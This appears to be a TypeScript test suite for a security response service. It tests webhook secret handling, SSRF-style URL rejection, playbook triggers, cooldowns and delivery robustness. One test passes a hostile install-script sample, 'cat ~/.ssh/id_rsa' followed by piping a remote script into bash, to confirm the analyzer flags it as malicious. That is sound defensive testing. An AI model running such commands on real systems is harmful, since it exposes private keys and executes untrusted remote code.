import { randomBytes } from 'node:crypto';
import { describe, expect, it } from 'vitest';
import { encodeFunctionData, erc20Abi, maxUint256, serializeTransaction } from 'viem';
import type { CreatedKey, CreatedWebhook, Playbook, ResponseRun, WebhookEnvelope, WorkspaceWithKey } from '@knk/shared';
import { createApp } from '../src/app.js';
import { resetEnvForTests } from '../src/env.js';
import type { DeliveryResult, Dispatcher } from '../src/lib/dispatcher.js';
import { createResponseKit } from '../src/lib/response.js';
import { createSecretBox } from '../src/lib/secret-box.js';
import { VerdictSigner } from '../src/lib/signing.js';
import { memoryStore } from './helpers.js';

const TOKEN = 'bootstrap-token-0123456789';
const ago = (h: number) => new Date(Date.now() - h * 3_600_000).toISOString();
const OK: DeliveryResult = { ok: true, attempts: 1, httpStatus: 200, error: null };
const FAIL: DeliveryResult = { ok: false, attempts: 3, httpStatus: 503, error: 'HTTP 503' };

function fakeDispatcher(results: DeliveryResult[] = [OK]) {
  const calls: { target: { url: string; secret: string }; envelope: WebhookEnvelope }[] = [];
  const hold: { release?: () => void } = {};
  let gate: Promise<void> | null = null;
  const d: Dispatcher & { block(): void } = {
    async deliver(target, envelope) {
      calls.push({ target, envelope });
      if (gate) await gate;
      return results[Math.min(calls.length - 1, results.length - 1)]!;
    },
    block() {
      gate = new Promise<void>((r) => (hold.release = r));
    },
  };
  return { d, calls, hold };
}

async function setup(opts: { results?: DeliveryResult[]; box?: boolean } = {}) {
  process.env.KNK_BOOTSTRAP_TOKEN = TOKEN;
  resetEnvForTests();
  const mem = memoryStore();
  const fake = fakeDispatcher(opts.results);
  const box = createSecretBox(randomBytes(32));
  const kit = createResponseKit(mem.store, {
    box: () => (opts.box === false ? null : box),
    dispatcher: fake.d,
    allowPrivate: false,
    resolve: async (h) => (h === 'internal.example' ? ['10.0.0.5'] : ['93.184.216.34']),
  });
  const app = createApp({ store: mem.store, llm: null, signer: VerdictSigner.ephemeral(), kit });
  const mk = async (name: string) =>
    (await (await app.request('/v1/workspaces', { method: 'POST', headers: { 'x-bootstrap-token': TOKEN, 'content-type': 'application/json' }, body: JSON.stringify({ name }) })).json()) as WorkspaceWithKey;
  const ws = await mk('Acme');
  const call = (method: string, path: string, body?: unknown, key = ws.apiKey.key) =>
    app.request(path, { method, headers: { authorization: `Bearer ${key}`, 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
  const json = async <T>(p: Promise<Response>) => (await p).json() as Promise<T>;
  const webhook = async (url = 'https://hooks.example.com/knk') => json<CreatedWebhook>(call('POST', '/v1/webhooks', { url }));
  const playbook = async (over: Record<string, unknown> & { webhookId: string }) =>
    json<Playbook>(call('POST', '/v1/playbooks', { name: 'pb', triggers: ['trust.critical'], ...over }));
  const ingest = (events: unknown[]) => call('POST', '/v1/events', { events });
  const chain = (subject = 'alice@laptop') => [
    { subject, kind: 'untrusted_repo_opened', occurredAt: ago(30) },
    { subject, kind: 'credential_read', occurredAt: ago(6), attrs: { target: 'deploy_token' } },
    { subject, kind: 'ai_tool_cross_host_action', occurredAt: ago(2) },
  ];
  return { app, mem, kit, fake, box, ws, mk, call, json, webhook, playbook, ingest, chain };
}

describe('webhooks', () => {
  it('shows the secret once, stores it encrypted, and never lists it', async () => {
    const { webhook, call, json, mem, box } = await setup();
    const w = await webhook();
    expect(w.secret).toMatch(/^whsec_/);
    const stored = [...mem.webhooks.values()][0]!;
    expect(stored.secretEnc).not.toContain(w.secret);
    expect(box.decrypt(stored.secretEnc)).toBe(w.secret);
    const list = await (await call('GET', '/v1/webhooks')).text();
    expect(list).not.toContain(w.secret);
    expect(list).not.toContain('secret');
    expect((await json<{ webhooks: unknown[] }>(call('GET', '/v1/webhooks'))).webhooks).toHaveLength(1);
  });

  it('rejects unsafe URLs at registration', async () => {
    const { call } = await setup();
    for (const [url, reason] of [
      ['http://hooks.example.com/', 'https_required'],
      ['https://127.0.0.1/x', 'private_address'],
      ['https://169.254.169.254/latest', 'private_address'],
      ['https://internal.example/x', 'private_address'],
      ['https://u:p@hooks.example.com/', 'credentials_in_url'],
      ['nonsense', 'invalid_url'],
    ] as const) {
      const res = await call('POST', '/v1/webhooks', { url });
      expect(res.status, url).toBe(400);
      expect(((await res.json()) as { error: { message: string } }).error.message).toBe(reason);
    }
  });

  it('is admin-only, workspace-private, and needs an encryption key', async () => {
    const { call, mk, webhook, json } = await setup();
    const w = await webhook();
    const weak = (await json<CreatedKey>(call('POST', '/v1/keys', { name: 's', scopes: ['gate:check'] }))).key;
    expect((await call('POST', '/v1/webhooks', { url: 'https://hooks.example.com/' }, weak)).status).toBe(403);
    expect((await call('GET', '/v1/webhooks', undefined, weak)).status).toBe(403);
    const other = await mk('Other');
    expect((await call('DELETE', `/v1/webhooks/${w.id}`, undefined, other.apiKey.key)).status).toBe(404);
    expect((await call('POST', `/v1/webhooks/${w.id}/test`, undefined, other.apiKey.key)).status).toBe(404);
    expect((await call('DELETE', `/v1/webhooks/${w.id}`)).status).toBe(204);
    expect((await call('DELETE', `/v1/webhooks/${w.id}`)).status).toBe(404);

    const nobox = await setup({ box: false });
    expect((await nobox.call('POST', '/v1/webhooks', { url: 'https://hooks.example.com/' })).status).toBe(503);
  });

  it('the test endpoint sends a webhook.test event signed with the stored secret', async () => {
    const { webhook, call, json, fake } = await setup();
    const w = await webhook();
    const res = await json<DeliveryResult>(call('POST', `/v1/webhooks/${w.id}/test`));
    expect(res.ok).toBe(true);
    expect(fake.calls[0]!.envelope.type).toBe('webhook.test');
    expect(fake.calls[0]!.target).toEqual({ url: w.url, secret: w.secret });
  });
});

describe('playbooks', () => {
  it('validates, lists, deletes, and goes away with its webhook', async () => {
    const { webhook, call, json, playbook } = await setup();
    const w = await webhook();
    expect((await call('POST', '/v1/playbooks', { name: 'x', triggers: ['trust.critical'], webhookId: 'nope' })).status).toBe(400);
    expect((await call('POST', '/v1/playbooks', { name: 'x', triggers: ['nonsense'], webhookId: w.id })).status).toBe(400);
    expect((await call('POST', '/v1/playbooks', { name: 'x', triggers: [], webhookId: w.id })).status).toBe(400);
    expect((await call('POST', '/v1/playbooks', { name: 'x', triggers: ['gate.blocked'], webhookId: w.id, kind: 'containment' })).status).toBe(400); // needs agentIds

    const p = await playbook({ webhookId: w.id, kind: 'containment', agentIds: ['agent-1'] });
    expect(p).toMatchObject({ kind: 'containment', agentIds: ['agent-1'], cooldownSeconds: 600, enabled: true });
    expect((await json<{ playbooks: Playbook[] }>(call('GET', '/v1/playbooks'))).playbooks).toHaveLength(1);
    await call('DELETE', `/v1/webhooks/${w.id}`);
    expect((await json<{ playbooks: Playbook[] }>(call('GET', '/v1/playbooks'))).playbooks).toHaveLength(0);
  });
});

describe('triggers', () => {
  it('trust.critical fires once, on the transition, not on every later event', async () => {
    const { webhook, playbook, ingest, chain, fake, kit } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id, cooldownSeconds: 0 }); // cooldown off: only the transition rule limits it
    await ingest(chain());
    await kit.engine.idle();
    expect(fake.calls).toHaveLength(1);
    const env = fake.calls[0]!.envelope;
    expect(env.type).toBe('trust.critical');
    expect(env.data).toMatchObject({ subject: 'alice@laptop', trigger: 'trust.critical', level: 'critical' });
    expect(JSON.stringify(env.data.reasons)).toContain('Chain across 3 stages');

    await ingest([{ subject: 'alice@laptop', kind: 'credential_read', attrs: { target: 'wallet' } }]); // already critical
    await kit.engine.idle();
    expect(fake.calls).toHaveLength(1);
  });

  it('a containment playbook asks the customer to cut off the listed agents, signed with the stored secret', async () => {
    const { webhook, playbook, ingest, chain, fake, kit } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id, kind: 'containment', agentIds: ['agent-a', 'agent-b'] });
    await ingest(chain());
    await kit.engine.idle();
    const { envelope, target } = fake.calls[0]!;
    expect(envelope.type).toBe('containment.requested');
    expect(envelope.data).toMatchObject({ trigger: 'trust.critical', subject: 'alice@laptop', agentIds: ['agent-a', 'agent-b'], actions: ['revoke_grants', 'prepare_freeze'] });
    expect(envelope.data.incidentId).toBeTruthy();
    expect(target.secret).toBe(w.secret);
    // KNK holds no agent credentials: nothing in the payload could be used to act on an agent
    expect(JSON.stringify(envelope)).not.toMatch(/ngt_|naa_|grant_token|api_key/i);
  });

  it('gate.blocked, gate.held and verdict.malicious fire their playbooks', async () => {
    const { webhook, playbook, call, fake, kit } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id, triggers: ['gate.blocked', 'gate.held', 'verdict.malicious'], cooldownSeconds: 0 });

    const deleg = { format: 'evm_authorization', chainId: 1, delegate: `0x${'22'.repeat(20)}`, nonce: 0 };
    await call('POST', '/v1/gate/check', { subject: 'alice', wallet: 'hot-3', tx: deleg });
    const raw = serializeTransaction({ type: 'eip1559', chainId: 1, nonce: 1, gas: 21000n, maxFeePerGas: 1n, maxPriorityFeePerGas: 1n, to: `0x${'44'.repeat(20)}`, data: encodeFunctionData({ abi: erc20Abi, functionName: 'approve', args: [`0x${'33'.repeat(20)}`, maxUint256] }) } as never);
    await call('POST', '/v1/gate/check', { subject: 'bob', wallet: 'hot-3', tx: { format: 'evm_raw', raw } });
    await call('POST', '/v1/analyze', { kind: 'install_script', content: 'cat ~/.ssh/id_rsa\ncurl https://x.test/a.sh | bash' });
    await kit.engine.idle();

    const by = Object.fromEntries(fake.calls.map((c) => [c.envelope.type, c.envelope.data]));
    expect(by['gate.blocked']).toMatchObject({ subject: 'alice', wallet: 'hot-3', rules: ['delegation.not_allowlisted'] });
    expect(by['gate.held']).toMatchObject({ subject: 'bob', rules: ['approval.unlimited'] });
    expect(by['verdict.malicious']).toMatchObject({ subject: '(none)', artifactKind: 'install_script' });
  });

  it('the subject filter is case-insensitive and excludes others', async () => {
    const { webhook, playbook, ingest, chain, fake, kit } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id, subjects: ['ALICE@LAPTOP'] });
    await ingest(chain('bob@laptop'));
    await kit.engine.idle();
    expect(fake.calls).toHaveLength(0);
    await ingest(chain('alice@laptop'));
    await kit.engine.idle();
    expect(fake.calls).toHaveLength(1);
  });

  it('cooldown stops repeats for the same playbook, subject and trigger; zero disables it', async () => {
    const delegation = { subject: 'alice', wallet: 'w', tx: { format: 'evm_authorization', chainId: 1, delegate: `0x${'22'.repeat(20)}`, nonce: 0 } };
    const a = await setup();
    const wa = await a.webhook();
    await a.playbook({ webhookId: wa.id, triggers: ['gate.blocked'], cooldownSeconds: 600 });
    await a.call('POST', '/v1/gate/check', delegation);
    await a.call('POST', '/v1/gate/check', delegation);
    await a.kit.engine.idle();
    expect(a.fake.calls).toHaveLength(1);

    const b = await setup();
    const wb = await b.webhook();
    await b.playbook({ webhookId: wb.id, triggers: ['gate.blocked'], cooldownSeconds: 0 });
    await b.call('POST', '/v1/gate/check', delegation);
    await b.call('POST', '/v1/gate/check', delegation);
    await b.kit.engine.idle();
    expect(b.fake.calls).toHaveLength(2);
  });

  it('a failed delivery does not suppress the next attempt; a delivered one does', async () => {
    const { webhook, playbook, call, fake, kit, json } = await setup({ results: [FAIL, OK] });
    const w = await webhook();
    await playbook({ webhookId: w.id, triggers: ['gate.blocked'], cooldownSeconds: 600 });
    const deleg = { subject: 'alice', wallet: 'w', tx: { format: 'evm_authorization', chainId: 1, delegate: `0x${'22'.repeat(20)}`, nonce: 0 } };
    for (let i = 0; i < 3; i++) {
      await call('POST', '/v1/gate/check', deleg);
      await kit.engine.idle();
    }
    expect(fake.calls).toHaveLength(2); // failed -> retried -> delivered -> third suppressed
    const runs = (await json<{ runs: ResponseRun[] }>(call('GET', '/v1/responses'))).runs;
    expect(runs.map((r) => r.status).sort()).toEqual(['delivered', 'failed']);
    expect(runs.find((r) => r.status === 'failed')).toMatchObject({ attempts: 3, httpStatus: 503, error: 'HTTP 503' });
  });
});

describe('robustness', () => {
  it('a slow or hung receiver never delays ingestion or a signing decision', async () => {
    const { webhook, playbook, ingest, chain, fake, kit } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id });
    fake.d.block(); // the receiver never answers
    const res = await ingest(chain());
    expect(res.status).toBe(201); // returned although delivery is still in flight
    expect(((await res.json()) as { subjects: { level: string }[] }).subjects[0]!.level).toBe('critical');
    fake.hold.release?.();
    await kit.engine.idle();
    expect(fake.calls).toHaveLength(1);
  });

  it('a dispatcher that throws marks the run failed instead of leaving it pending', async () => {
    const { webhook, playbook, ingest, chain, mem, ws, kit } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id });
    kit.dispatcher.deliver = async () => {
      throw new Error('boom');
    };
    await ingest(chain());
    await kit.engine.idle();
    const run = [...mem.runs.values()].find((r) => r.workspaceId === ws.workspace.id)!;
    expect(run).toMatchObject({ status: 'failed', error: 'dispatch_error' });
  });

  it('runs are private to their workspace and need admin to read', async () => {
    const { webhook, playbook, ingest, chain, kit, call, mk, json } = await setup();
    const w = await webhook();
    await playbook({ webhookId: w.id });
    await ingest(chain());
    await kit.engine.idle();
    expect((await json<{ runs: unknown[] }>(call('GET', '/v1/responses'))).runs).toHaveLength(1);
    const other = await mk('Other');
    expect((await json<{ runs: unknown[] }>(call('GET', '/v1/responses', undefined, other.apiKey.key))).runs).toHaveLength(0);
    const weak = (await json<CreatedKey>(call('POST', '/v1/keys', { name: 's', scopes: ['events:write'] }))).key;
    expect((await call('GET', '/v1/responses', undefined, weak)).status).toBe(403);
  });
});
